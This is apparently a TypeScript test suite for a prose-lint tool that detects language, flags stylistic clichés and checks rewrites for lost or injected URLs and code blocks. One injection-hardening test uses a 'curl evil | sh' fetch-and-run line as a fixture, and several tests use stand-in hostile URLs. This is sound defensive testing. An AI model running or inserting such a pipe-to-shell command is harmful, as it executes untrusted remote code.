// server/lib/prose-lint.ts — the pure lint behind the `prose` job. Each rule is pinned by a case
// that fires it and a case that must stay silent. The load-bearing one is German text carrying
// English technical terms: that is the desired register, so it must produce ZERO findings.

import { describe, expect, test } from "bun:test";
import {
  addedContent,
  detectLanguage,
  lintProse,
  leftFenceOpen,
  lostContent,
  type ProseLanguage,
} from "../server/lib/prose-lint.ts";

function rules(text: string, language: ProseLanguage): string[] {
  return lintProse(text, language).map((f) => f.rule);
}

describe("detectLanguage — English words that spell German function words", () => {
  test('"Die sizes vary. Hat production stopped." is not read as German', () => {
    expect(detectLanguage("Die sizes vary. Hat production stopped.")).not.toBe("de");
  });

  test("with an English signal beside them they read as English", () => {
    expect(
      detectLanguage("Die sizes vary. Hat production stopped because the line was full."),
    ).toBe("en");
  });
});

describe("lostContent", () => {
  const ORIGINAL = "See https://example.com/docs.\n\n```ts\nconst x = 1;\n```\n\nDone.";

  test("nothing lost when the fenced block and the URL survive", () => {
    expect(
      lostContent(ORIGINAL, "Docs: https://example.com/docs\n\n```ts\nconst x = 1;\n```"),
    ).toBeNull();
  });

  test("a dropped fenced block is named", () => {
    expect(lostContent(ORIGINAL, "See https://example.com/docs.")).toContain("fenced code block");
  });

  test("an altered fenced block counts as dropped", () => {
    expect(lostContent(ORIGINAL, "https://example.com/docs\n\n```ts\nconst x = 2;\n```")).toContain(
      "fenced code block",
    );
  });

  test("a dropped URL is named", () => {
    const lost = lostContent(ORIGINAL, "```ts\nconst x = 1;\n```");
    expect(lost).toContain("https://example.com/docs");
    expect(lost).not.toContain("fenced");
  });

  test("a longer fence holding a shorter one is one block", () => {
    const original = "````md\n```ts\nx\n```\n````\n";
    expect(lostContent(original, original)).toBeNull();
    expect(lostContent(original, "```ts\nx\n```")).toContain("fenced code block");
  });
});

describe("detectLanguage", () => {
  test("German prose is detected as de, English as en", () => {
    expect(detectLanguage("Der Cache wird geleert und die Pipeline läuft danach neu.")).toBe("de");
    expect(detectLanguage("The cache is cleared and the pipeline is run again.")).toBe("en");
  });

  test("no signal or a tie is neutral, never English", () => {
    expect(detectLanguage("cache deployment")).toBe("neutral");
    expect(detectLanguage("Feature unlock")).toBe("neutral");
  });

  test("short German copy with English tech terms is German", () => {
    expect(detectLanguage("Deployment Pipeline: Cache leeren, PR mergen, Endpoint prüfen.")).toBe(
      "de",
    );
    expect(detectLanguage("Feature unlock verfügbar")).toBe("de");
  });

  test("fenced code does not vote", () => {
    const text = "```\nthe and is of to that this with for are it\n```\nDer Cache wird geleert.";
    expect(detectLanguage(text)).toBe("de");
  });
});

describe("neutral mode", () => {
  test("runs no language-specific lexicon rule", () => {
    expect(rules("Feature unlock robust delve", "neutral")).toEqual([]);
    expect(rules("Nicht nur schnell, sondern auch sicher.", "neutral")).toEqual([]);
  });

  test("still runs the language-agnostic rules", () => {
    const long = Array.from({ length: 34 }, (_, i) => `word${i}`).join(" ") + ".";
    expect(rules(long, "neutral")).toContain("long-sentence");
  });
});

describe("detected language drives the lexicon", () => {
  const detected = (text: string) => rules(text, detectLanguage(text));

  test("German copy with English tech terms is not flagged by English rules", () => {
    expect(detected("Deployment Pipeline: Cache leeren, PR mergen, Endpoint prüfen.")).toEqual([]);
    expect(detected("Feature unlock verfügbar")).not.toContain("banned-unlock");
  });

  test("English copy is still flagged", () => {
    expect(detected("The team will delve into the crucial parts of the plan.")).toEqual(
      expect.arrayContaining(["banned-delve", "banned-crucial"]),
    );
  });
});

describe("German text with English technical terms", () => {
  test("produces zero findings — code-switching is the desired register", () => {
    const text = [
      "Das Deployment läuft über die Pipeline. Der Cache wird danach geleert.",
      "Der Endpoint antwortet, der Release-Build ist grün, die PR ist offen.",
      "Der Commit enthält den Fix, und der Rollback bleibt als Option erhalten.",
    ].join("\n");
    expect(lintProse(text, "de")).toEqual([]);
  });

  test("English banned words inside German text are not flagged", () => {
    expect(
      lintProse("Das Testament der Firma ist robust und vibrant, ein Thema zum unlock.", "de"),
    ).toEqual([]);
  });
});

describe("English lexicon rules", () => {
  test("a banned word is flagged on its own line", () => {
    const findings = lintProse("The cache is fine.\nWe delve into a crucial detail.", "en");
    const hit = findings.find((f) => f.rule === "banned-delve");
    expect(hit?.line).toBe(2);
    expect(findings.map((f) => f.rule)).toContain("banned-crucial");
  });

  test("the banned list is case-insensitive and catches stems", () => {
    expect(rules("Teams leverage the new Robust queue.", "en")).toEqual(
      expect.arrayContaining(["banned-leverage", "banned-robust"]),
    );
  });

  test("a metaphorical landscape is flagged, a technical one is not", () => {
    expect(rules("The rapidly changing landscape shifts.", "en")).toContain("metaphor-landscape");
    expect(rules("The cloud landscape has three providers.", "en")).not.toContain(
      "metaphor-landscape",
    );
  });

  test("a significance participle trailing a clause is flagged", () => {
    expect(rules("The rollout finished, underscoring the team's discipline.", "en")).toContain(
      "significance-participle",
    );
  });
});

describe("negative parallelism", () => {
  test("English 'not X, it's Y' and 'not just X but Y' are flagged", () => {
    expect(rules("It's not a bug, it's a feature.", "en")).toContain("negative-parallelism");
    expect(rules("Not just the cache but also the queue.", "en")).toContain("negative-parallelism");
  });

  test("German 'nicht nur … sondern auch' is flagged in German text", () => {
    expect(rules("Das Tool ist nicht nur schnell, sondern auch sicher.", "de")).toContain(
      "negative-parallelism",
    );
  });
});

describe("German rules", () => {
  test("two passive auxiliaries in one sentence are a passive chain", () => {
    expect(rules("Die Datei wird gelesen und wird danach gelöscht.", "de")).toContain(
      "passive-chain",
    );
  });

  test("dense -ung/-heit/-keit Nominalstil is flagged over the threshold", () => {
    const words = Array.from({ length: 70 }, (_, i) =>
      i % 3 === 0 ? "Verbesserung" : i % 3 === 1 ? "Konfiguration" : "und",
    );
    const text = words.join(" ") + ".";
    expect(rules(text, "de")).toContain("nominalstil");
  });

  test("ordinary German below the threshold is not flagged as Nominalstil", () => {
    const text =
      Array.from({ length: 70 }, (_, i) => (i % 14 === 0 ? "Lösung" : "die")).join(" ") + ".";
    expect(rules(text, "de")).not.toContain("nominalstil");
  });
});

const para = (n: number) => Array.from({ length: n }, () => "word").join(" ") + ".";

describe("structure rules", () => {
  test("a sentence longer than 30 words is flagged", () => {
    const long = Array.from({ length: 34 }, (_, i) => `word${i}`).join(" ") + ".";
    expect(rules(long, "en")).toContain("long-sentence");
  });

  test("a near-duplicate sentence is flagged on its second occurrence", () => {
    const text = [
      "The migration moved every table into the new schema without downtime.",
      "Unrelated words sit between them here, making the paragraph longer.",
      "The migration moved every table into the new schema without any downtime.",
    ].join("\n");
    const findings = lintProse(text, "en");
    expect(findings.find((f) => f.rule === "repeated-sentence")?.line).toBe(3);
  });

  test("uniform paragraph lengths are flagged, varied ones are not", () => {
    const uniform = [para(24), para(25), para(24), para(25)].join("\n\n");
    expect(rules(uniform, "en")).toContain("uniform-paragraphs");
    const varied = [para(12), para(60), para(25), para(90)].join("\n\n");
    expect(rules(varied, "en")).not.toContain("uniform-paragraphs");
  });
});

describe("code is not prose", () => {
  test("fenced code is ignored", () => {
    const text = "Intro line.\n\n```ts\n// we delve into this crucial robust seamless code\n```\n";
    expect(lintProse(text, "en")).toEqual([]);
  });

  test("inline code spans are ignored", () => {
    expect(lintProse("Call `leverage()` once the cache is warm.", "en")).toEqual([]);
  });
});

describe("lostContent — whole-token URLs", () => {
  test("an extended URL is a different link: the original is named as lost", () => {
    const lost = lostContent("see https://example.com/docs", "see https://example.com/docs-v2");
    expect(lost).toContain("https://example.com/docs");
    expect(lost).not.toContain("docs-v2");
  });

  test("a URL with a parenthesised segment is extracted whole", () => {
    const wiki = "https://en.wikipedia.org/wiki/Foo_(bar)";
    expect(lostContent(`Read ${wiki} first.`, `First read ${wiki}.`)).toBeNull();
    expect(
      lostContent(`Read ${wiki} first.`, "Read https://en.wikipedia.org/wiki/Foo_ first."),
    ).toBe(`the URL ${wiki}`);
  });

  test("a URL inside parentheses does not take the closing parenthesis", () => {
    expect(lostContent("(see https://x.com/a)", "See https://x.com/a for more.")).toBeNull();
    expect(addedContent("(see https://x.com/a)", "See https://x.com/a for more.")).toBeNull();
  });

  test("sentence punctuation after a URL is not part of it", () => {
    expect(lostContent("Docs live at https://x.com/a.", "https://x.com/a is the home.")).toBeNull();
    expect(
      addedContent("Docs live at https://x.com/a.", "https://x.com/a is the home."),
    ).toBeNull();
  });
});

describe("one fence parser", () => {
  test("a ~~~ block containing a ``` line does not end early: later prose stays linted", () => {
    const text = ["~~~", "```", "we delve into the crucial realm", "~~~", "We leverage this."].join(
      "\n",
    );
    const findings = lintProse(text, "en");
    expect(findings.map((f) => f.rule)).toEqual(["banned-leverage"]);
    expect(findings[0].line).toBe(5);
  });

  test("a shorter marker does not close a longer fence", () => {
    const text = "````\n```\nwe delve in\n```\n````\nWe leverage this.";
    expect(rules(text, "en")).toEqual(["banned-leverage"]);
  });
});

describe("blockquoted fences", () => {
  const BLOCK = "```ts\nconst x = 1;\n```";
  const QUOTED = "> ```ts\n> const x = 1;\n> ```";

  test("a blockquoted fence dropped by the rewrite is lost", () => {
    expect(lostContent(`Intro.\n\n${QUOTED}`, "Intro.")).toContain("fenced code block");
  });

  test("a blockquoted fence injected by the rewrite is added", () => {
    expect(addedContent("Intro.", `Intro.\n\n${QUOTED}`)).toContain("fenced code block");
  });

  test("nested quote markers are read, and quoting alone is not a change", () => {
    expect(lostContent(QUOTED, "> > ```ts\n> > const x = 1;\n> > ```")).toBeNull();
    expect(lostContent(BLOCK, QUOTED)).toBeNull();
    expect(addedContent(BLOCK, QUOTED)).toBeNull();
  });

  test("lint skips the body of a blockquoted fence", () => {
    const text = "Intro line.\n\n> ```ts\n> // we delve into this crucial robust code\n> ```\n";
    expect(lintProse(text, "en")).toEqual([]);
  });

  test("an unclosed blockquoted fence is reported open", () => {
    expect(leftFenceOpen("Intro.", "> ```ts\n> const x = 1;")).toBe(true);
  });
});

describe("emphasis-wrapped URLs", () => {
  test("a bold URL tokenizes as the bare URL on either side", () => {
    expect(lostContent("See **https://x.com/a**.", "See https://x.com/a.")).toBeNull();
    expect(lostContent("See https://x.com/a.", "See **https://x.com/a**.")).toBeNull();
    expect(addedContent("See https://x.com/a.", "See **https://x.com/a**.")).toBeNull();
  });

  test("underscore and strikethrough wrappers are stripped too", () => {
    expect(lostContent("See __https://x.com/a__.", "See https://x.com/a.")).toBeNull();
    expect(lostContent("See _https://x.com/a_.", "See https://x.com/a.")).toBeNull();
    expect(lostContent("See ~~https://x.com/a~~.", "See https://x.com/a.")).toBeNull();
    expect(lostContent("See *https://x.com/a*,", "See https://x.com/a.")).toBeNull();
  });

  test("underscore-wrapped URLs are extracted, not skipped", () => {
    expect(lostContent("See _https://x.com/a_.", "See nothing.")).toBe("the URL https://x.com/a");
    expect(lostContent("See __https://x.com/a__.", "See nothing.")).toBe("the URL https://x.com/a");
  });

  test("a scheme glued to a word is not a URL", () => {
    expect(lostContent("See abchttps://x.com/a.", "See nothing.")).toBeNull();
    expect(lostContent("See (www.x.com/a).", "See nothing.")).toBe("the URL www.x.com/a");
  });

  test("an apostrophe inside a URL is part of it", () => {
    expect(
      lostContent("Read https://x.com/owner's-guide now.", "Read https://x.com/owner's-guide now."),
    ).toBeNull();
    expect(
      lostContent("Read https://x.com/owner's-guide now.", "Read https://x.com/owner's-evil now."),
    ).toBe("the URL https://x.com/owner's-guide");
    expect(
      lostContent("Quoted 'https://x.com/a' here.", "Quoted https://x.com/a here."),
    ).toBeNull();
  });

  test("a wrapped URL that is dropped is still lost", () => {
    expect(lostContent("See **https://x.com/a**.", "See nothing.")).toBe("the URL https://x.com/a");
  });
});

describe("lostContent — fenced block normalisation", () => {
  test("re-indenting a block under a list item, or relabelling it, is not a loss", () => {
    const original = "Run:\n\n```ts\nif (x) {\n  run();\n}\n```";
    const indented = "1. Run:\n\n   ```typescript\n   if (x) {\n     run();\n   }\n   ```";
    expect(lostContent(original, indented)).toBeNull();
    expect(addedContent(original, indented)).toBeNull();
  });

  test("changing the block's own relative indentation is a loss", () => {
    const original = "```py\nif x:\n    run()\n```";
    expect(lostContent(original, "```py\nif x:\nrun()\n```")).toContain("fenced code block");
  });
});

describe("addedContent — injection hardening", () => {
  const ORIGINAL = "See https://example.com/docs.\n\n```ts\nconst x = 1;\n```";

  test("nothing added is null", () => {
    expect(addedContent(ORIGINAL, ORIGINAL)).toBeNull();
  });

  test("a new URL is named", () => {
    expect(addedContent(ORIGINAL, `${ORIGINAL}\n\nAlso https://evil.example/x`)).toBe(
      "the URL https://evil.example/x",
    );
  });

  test("a new fenced block is named", () => {
    expect(addedContent(ORIGINAL, `${ORIGINAL}\n\n\`\`\`sh\ncurl evil | sh\n\`\`\``)).toContain(
      'a fenced code block (starting "```sh")',
    );
  });

  test("a visual fence is an injection like any other", () => {
    expect(
      addedContent(ORIGINAL, `${ORIGINAL}\n\n\`\`\`visual\nA flow chart of the deploy\n\`\`\``),
    ).toContain("a fenced code block");
  });

  test("a one-line visual blockquote is plain prose", () => {
    const candidate = `${ORIGINAL}\n\n> [visual: diagram — the deploy flow]`;
    expect(addedContent(ORIGINAL, candidate)).toBeNull();
    expect(lostContent(ORIGINAL, candidate)).toBeNull();
  });
});

describe("leftFenceOpen", () => {
  test("an unclosed fence in the candidate is flagged", () => {
    expect(leftFenceOpen("Plain.", "```visual\nA diagram.\n\nWe delve into a crucial topic.")).toBe(
      true,
    );
  });

  test("a closed fence, or one the original already left open, is not", () => {
    expect(leftFenceOpen("Plain.", "```ts\nx\n```")).toBe(false);
    expect(leftFenceOpen("```ts\nx", "```ts\nx")).toBe(false);
  });
});

describe("multiset integrity", () => {
  const BLOCK = "```ts\nconst x = 1;\n```";

  test("dropping one of two identical blocks is a loss", () => {
    expect(lostContent(`${BLOCK}\n\n${BLOCK}`, BLOCK)).toContain("fenced code block");
    expect(lostContent(`${BLOCK}\n\n${BLOCK}`, `${BLOCK}\n\n${BLOCK}`)).toBeNull();
  });

  test("adding a duplicate block is an addition", () => {
    expect(addedContent(BLOCK, `${BLOCK}\n\n${BLOCK}`)).toContain("fenced code block");
    expect(addedContent(`${BLOCK}\n\n${BLOCK}`, `${BLOCK}\n\n${BLOCK}`)).toBeNull();
  });

  test("the same holds for URLs", () => {
    const twice = "See https://x.com/a and again https://x.com/a.";
    expect(lostContent(twice, "See https://x.com/a.")).toBe("the URL https://x.com/a");
    expect(addedContent("See https://x.com/a.", twice)).toBe("the URL https://x.com/a");
    expect(lostContent(twice, twice)).toBeNull();
  });
});

describe("URL tokens", () => {
  test("the scheme and host are case-insensitive, the path is not", () => {
    expect(
      lostContent("See https://Example.com/Docs.", "See HTTPS://example.COM/Docs."),
    ).toBeNull();
    expect(lostContent("See https://example.com/Docs.", "See https://example.com/docs.")).toBe(
      "the URL https://example.com/Docs",
    );
  });

  test("a www. host is extracted, and an added one is named", () => {
    expect(addedContent("Nothing.", "Try www.evil.example/x now.")).toBe(
      "the URL www.evil.example/x",
    );
    expect(lostContent("Try www.good.example/x.", "Nothing.")).toBe("the URL www.good.example/x");
  });

  test("nested parentheses stay in the URL, so a changed inner segment is detected", () => {
    const a = "https://en.wikipedia.org/wiki/Foo_(bar_(x))";
    const b = "https://en.wikipedia.org/wiki/Foo_(bar_(y))";
    expect(lostContent(`Read ${a}.`, `Read ${a}.`)).toBeNull();
    expect(lostContent(`Read ${a}.`, `Read ${b}.`)).toBe(`the URL ${a}`);
    expect(addedContent(`Read ${a}.`, `Read ${b}.`)).toBe(`the URL ${b}`);
  });

  test("an unbalanced closing parenthesis or bracket ends the URL", () => {
    expect(lostContent("([docs](https://x.com/a))", "See https://x.com/a.")).toBeNull();
    expect(lostContent("[https://x.com/a]", "See https://x.com/a.")).toBeNull();
  });

  test("a bracketed IPv6 host is extracted", () => {
    expect(addedContent("Nothing.", "Local: http://[::1]/a.")).toBe("the URL http://[::1]/a");
  });
});

describe("sentence rules skip structural lines", () => {
  const sentence = (n: number) => `${Array.from({ length: n }, (_, i) => `word${i}`).join(" ")}.`;

  test("a list item over 30 words is not a long sentence, a paragraph is", () => {
    expect(rules(`- ${sentence(34)}`, "en")).not.toContain("long-sentence");
    expect(rules(sentence(34), "en")).toContain("long-sentence");
  });

  test("converting prose to short list items adds no long-sentence finding", () => {
    const items = Array.from({ length: 3 }, () => `- ${sentence(25)}`).join("\n");
    expect(rules(items, "en")).not.toContain("long-sentence");
  });

  test("repeated list items are not a repeated sentence", () => {
    const item = "- The migration moved every table into the new schema without downtime.";
    expect(rules(`${item}\n${item}`, "en")).not.toContain("repeated-sentence");
  });

  test("lexicon rules still run on list items and headings", () => {
    expect(rules("# We delve in\n- It is robust", "en")).toEqual(["banned-delve", "banned-robust"]);
  });
});
